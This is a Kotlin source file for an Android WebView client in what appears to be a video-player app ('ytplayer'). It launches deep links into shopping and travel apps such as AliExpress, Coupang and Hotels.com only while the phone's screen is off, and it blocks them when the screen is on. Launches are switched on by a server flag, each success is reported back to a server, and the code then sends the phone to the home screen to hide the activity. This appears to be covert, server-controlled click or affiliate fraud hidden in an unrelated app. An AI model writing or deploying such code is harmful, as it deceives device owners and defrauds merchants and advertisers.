package com.hashmeter.ytplayer.monica.client

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import com.hashmeter.ytplayer.BuildConfig
import com.hashmeter.ytplayer.monica.data.repository.MonicaRepository
import com.hashmeter.ytplayer.monica.util.LiveCountFetcher
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Shared WebViewClient for Monica service
 * Blocks external app intents when screen is ON, allows when screen is OFF
 */
class MonicaWebViewClient(
    private val context: Context,
    private val onPageFinished: ((url: String) -> Unit)? = null,
    private val onError: ((url: String, errorMessage: String?) -> Unit)? = null
) : WebViewClient() {

    companion object {
        private const val TAG = "MonicaWebViewClient"

        // App package names
        private const val PKG_ALIEXPRESS = "com.alibaba.aliexpresshd"
        private const val PKG_COUPANG = "com.coupang.mobile"
        private const val PKG_CTRIP_ENGLISH = "ctrip.english"
        private const val PKG_EMARTMALL = "kr.co.emart.emartmall"
        private const val PKG_HOTELS = "com.hcom.android"
        private const val PKG_SSG = "kr.co.ssg"
        private const val PKG_YANOLJA = "com.cultsotry.yanolja.nativeapp"

        // App schemes
        private const val SCHEME_INTENT = "intent://"
        private const val SCHEME_MARKET = "market://"
        private const val SCHEME_ALIEXPRESS = "aliexpress://"
        private const val SCHEME_COUPANG = "coupang://"
        private const val SCHEME_CTRIPGLOBAL = "ctripglobal://"
        private const val SCHEME_EMARTMALL = "emartmall://"
        private const val SCHEME_HOTELSAPP = "hotelsapp://"
        private const val SCHEME_SSG = "ssg://"
        private const val SCHEME_YANOLJA = "yanoljamotel://"
    }

    private fun isScreenOn(): Boolean {
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        return powerManager.isInteractive
    }

    private fun isAppScheme(url: String): Boolean {
        return url.startsWith(SCHEME_INTENT) ||
                url.startsWith(SCHEME_MARKET) ||
                url.startsWith(SCHEME_ALIEXPRESS) ||
                url.startsWith(SCHEME_COUPANG) ||
                url.startsWith(SCHEME_CTRIPGLOBAL) ||
                url.startsWith(SCHEME_EMARTMALL) ||
                url.startsWith(SCHEME_HOTELSAPP) ||
                url.startsWith(SCHEME_SSG) ||
                url.startsWith(SCHEME_YANOLJA)
    }

    // Track last processed URL to prevent duplicate onPageFinished calls
    private var lastProcessedUrl: String? = null

    // Handler for delayed home return
    private val handler = Handler(Looper.getMainLooper())

    override fun shouldOverrideUrlLoading(
        view: WebView?,
        request: WebResourceRequest?
    ): Boolean {
        val url = request?.url?.toString() ?: return false
        val screenOn = isScreenOn()

        Log.d(TAG, "🔍 URL navigation: $url (Screen: ${if (screenOn) "ON" else "OFF"})")

        // Allow http/https to load in WebView
        if (url.startsWith("http://") || url.startsWith("https://")) {
            Log.d(TAG, "🌐 Loading in WebView")
            return false
        }

        // Handle intent:// scheme
        if (url.startsWith(SCHEME_INTENT)) {
            return handleAppScheme(url, screenOn, "intent://") { urlString ->
                Intent.parseUri(urlString, Intent.URI_INTENT_SCHEME).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
            }
        }

        // Handle market:// scheme (Play Store)
        if (url.startsWith(SCHEME_MARKET)) {
            return handleAppScheme(url, screenOn, "market://") { urlString ->
                Intent(Intent.ACTION_VIEW, Uri.parse(urlString)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
            }
        }

        // Handle aliexpress:// scheme
        if (url.startsWith(SCHEME_ALIEXPRESS)) {
            return handleAppScheme(url, screenOn, "aliexpress://") { urlString ->
                Intent(Intent.ACTION_VIEW, Uri.parse(urlString)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    setPackage(PKG_ALIEXPRESS)
                }
            }
        }

        // Handle coupang:// scheme
        if (url.startsWith(SCHEME_COUPANG)) {
            return handleAppScheme(url, screenOn, "coupang://") { urlString ->
                Intent(Intent.ACTION_VIEW, Uri.parse(urlString)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    setPackage(PKG_COUPANG)
                }
            }
        }

        // Handle ctripglobal:// scheme
        if (url.startsWith(SCHEME_CTRIPGLOBAL)) {
            return handleAppScheme(url, screenOn, "ctripglobal://") { urlString ->
                Intent(Intent.ACTION_VIEW, Uri.parse(urlString)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    setPackage(PKG_CTRIP_ENGLISH)
                }
            }
        }

        // Handle emartmall:// scheme
        if (url.startsWith(SCHEME_EMARTMALL)) {
            return handleAppScheme(url, screenOn, "emartmall://") { urlString ->
                Intent(Intent.ACTION_VIEW, Uri.parse(urlString)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    setPackage(PKG_EMARTMALL)
                }
            }
        }

        // Handle hotelsapp:// scheme
        if (url.startsWith(SCHEME_HOTELSAPP)) {
            return handleAppScheme(url, screenOn, "hotelsapp://") { urlString ->
                Intent(Intent.ACTION_VIEW, Uri.parse(urlString)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    setPackage(PKG_HOTELS)
                }
            }
        }

        // Handle ssg:// scheme
        if (url.startsWith(SCHEME_SSG)) {
            return handleAppScheme(url, screenOn, "ssg://") { urlString ->
                Intent(Intent.ACTION_VIEW, Uri.parse(urlString)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    setPackage(PKG_SSG)
                }
            }
        }

        // Handle yanoljamotel:// scheme
        if (url.startsWith(SCHEME_YANOLJA)) {
            return handleAppScheme(url, screenOn, "yanoljamotel://") { urlString ->
                Intent(Intent.ACTION_VIEW, Uri.parse(urlString)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    setPackage(PKG_YANOLJA)
                }
            }
        }

        // Handle any other app schemes
        if (url.contains("://")) {
            return handleAppScheme(url, screenOn, "app://") { urlString ->
                Intent(Intent.ACTION_VIEW, Uri.parse(urlString)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
            }
        }

        // Block all other schemes
        Log.d(TAG, "🚫 Blocked unknown URL: $url")
        return true
    }

    private fun handleAppScheme(
        url: String,
        screenOn: Boolean,
        schemeName: String,
        intentBuilder: (String) -> Intent
    ): Boolean {
        // Check if intents are enabled by server configuration
        val monicaRepository = MonicaRepository.getInstance(context)
        if (!monicaRepository.isIntentOn()) {
            Log.d(TAG, "🚫 Intent execution disabled by server (intent_on=false)")
            return true // Block intent
        }

        if (screenOn && !BuildConfig.DEBUG) {
            Log.d(TAG, "🚫 Screen ON - Blocked $schemeName URL")
            return true // Block when screen is ON
        }

        if (screenOn && BuildConfig.DEBUG) {
            Log.d(TAG, "🔧 DEBUG MODE: Screen ON bypass - Launching $schemeName URL")
        } else {
            Log.d(TAG, "✅ Screen OFF - Launching $schemeName URL")
        }
        try {
            val intent = intentBuilder(url)
            val targetPackage = intent.`package` ?: intent.component?.packageName

            // Verify the intent can actually be handled (app is installed)
            // resolveActivity returns null if no installed app can handle the intent
            val resolveInfo = context.packageManager.resolveActivity(intent, 0)
            if (resolveInfo == null) {
                Log.w(TAG, "🚫 No installed app can handle $schemeName URL (target: $targetPackage) — skipping intent and success report")
                return true
            }

            // Check if app was already running before launching
            val wasRunning = isAppRunning(targetPackage)
            Log.d(TAG, "📱 Target package: $targetPackage, was running: $wasRunning")

            context.startActivity(intent)
            Log.d(TAG, "📲 $schemeName intent launched successfully (package: $targetPackage)")

            // Report success to server
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val success = LiveCountFetcher.reportSuccess(context)
                    if (success) {
                        Log.d(TAG, "✅ Intent success reported to server")
                    } else {
                        Log.w(TAG, "⚠️ Failed to report intent success to server")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error reporting intent success", e)
                }
            }

            // Check if should return to home after intent execution
            val monicaRepository = MonicaRepository.getInstance(context)
            if (!monicaRepository.isForeground() && !wasRunning) {
                // Only return home if foreground mode is off AND app was not already running
                Log.d(TAG, "🏠 is_foreground=false and app was not running, returning to home after 3 seconds")
                returnHomeAfterDelay()
            } else {
                val reason = if (monicaRepository.isForeground()) "is_foreground=true" else "app was already running"
                Log.d(TAG, "🚫 Staying in launched app ($reason)")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to launch $schemeName intent", e)
        }
        return true
    }

    override fun onPageFinished(view: WebView?, url: String?) {
        super.onPageFinished(view, url)
        url?.let {
            // Skip if this is the same URL as last processed (prevents duplicate calls)
            if (it == lastProcessedUrl) {
                Log.d(TAG, "⏭️ Skipping duplicate onPageFinished for: $it")
                return
            }

            lastProcessedUrl = it
            Log.d(TAG, "Page loaded successfully: $it")
            onPageFinished?.invoke(it)
        }
    }

    override fun onReceivedError(
        view: WebView?,
        errorCode: Int,
        description: String?,
        failingUrl: String?
    ) {
        super.onReceivedError(view, errorCode, description, failingUrl)
        Log.e(TAG, "WebView error: $description for URL: $failingUrl")
        failingUrl?.let {
            onError?.invoke(it, description)
        }
    }

    /**
     * Check if app with given package name is currently running
     */
    private fun isAppRunning(packageName: String?): Boolean {
        if (packageName == null) return false

        try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val runningProcesses = activityManager.runningAppProcesses ?: return false

            return runningProcesses.any { it.processName == packageName }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to check if app is running", e)
            return false
        }
    }

    /**
     * Return to home screen after delay (only if is_foreground=false)
     */
    private fun returnHomeAfterDelay() {
        handler.postDelayed({
            returnHome()
        }, 3000) // 3 seconds delay
    }

    /**
     * Return to home screen
     */
    private fun returnHome() {
        try {
            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(homeIntent)
            Log.d(TAG, "🏠 Returned to home screen")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to return home", e)
        }
    }
}
